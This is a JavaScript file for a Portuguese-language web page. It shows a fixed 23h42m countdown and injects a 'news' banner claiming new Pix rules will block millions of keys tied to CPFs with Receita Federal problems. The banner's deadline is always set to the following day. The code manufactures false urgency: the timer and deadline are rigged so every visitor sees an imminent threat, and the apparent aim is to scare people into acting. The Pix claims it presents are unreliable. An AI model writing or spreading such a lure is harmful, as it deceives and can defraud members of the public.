function startCountdown(duration, display) {
    let timer = duration, hours, minutes, seconds;
    setInterval(function () {
        hours = parseInt(timer / 3600, 10);
        minutes = parseInt((timer % 3600) / 60, 10);
        seconds = parseInt(timer % 60, 10);

        hours = hours < 10 ? "0" + hours : hours;
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = `Tempo restante: ${hours}h ${minutes}m ${seconds}s`;

        if (--timer < 0) {
            timer = 0;
        }
    }, 1000);
}

function getNextDay() {
    const today = new Date();
    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);
    return tomorrow.getDate().toString().padStart(2, '0');
}

window.onload = function () {
    const countdownElement = document.getElementById('countdown');
    const countdownDuration = 23 * 3600 + 42 * 60; // 23 hours and 42 minutes in seconds
    startCountdown(countdownDuration, countdownElement);

    const nextDay = getNextDay();
    const newsDescription = document.getElementById('newsDescription');
    newsDescription.innerHTML = `<strong>Novas regras do Pix</strong>, válidas a partir de <strong>05/03/2025</strong>, determinarão o <strong>bloqueio de chaves</strong> vinculadas a CPFs com pendências na Receita Federal. <strong>Mais de 8 milhões de chaves</strong> serão bloqueadas até <strong>${nextDay}/03/25</strong> se as irregularidades não forem resolvidas, <strong>impedindo o envio e recebimento de valores pelo Pix</strong>.`;
};